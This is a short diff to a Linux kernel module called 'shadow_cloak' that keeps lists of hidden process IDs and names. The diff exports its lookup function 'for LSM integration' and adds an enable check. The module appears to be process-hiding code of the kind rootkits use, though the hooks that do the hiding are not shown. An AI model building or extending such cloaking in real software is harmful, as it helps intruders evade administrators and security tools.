@@ -58,13 +58,15 @@ static LIST_HEAD(hidden_pids);
 static LIST_HEAD(hidden_names);
 static DEFINE_SPINLOCK(cloak_lock);
 
-/* Check if PID is hidden - used by proc hooks */
-__maybe_unused
-static bool is_pid_hidden(pid_t pid)
+/* Check if PID is hidden - exported for LSM integration */
+bool shadow_cloak_is_hidden(pid_t pid)
 {
     struct hidden_pid *hp;
     struct task_struct *task;
     struct hidden_name *hn;
+    
+    if (!cloak_cfg.enabled)
+        return false;
     
     spin_lock(&cloak_lock);
     
@@ -93,6 +95,7 @@ static bool is_pid_hidden(pid_t pid)
     spin_unlock(&cloak_lock);
     return false;
 }
+EXPORT_SYMBOL_GPL(shadow_cloak_is_hidden);
 
 /* Add PID to hidden list */
 static int cloak_hide_pid(pid_t pid)
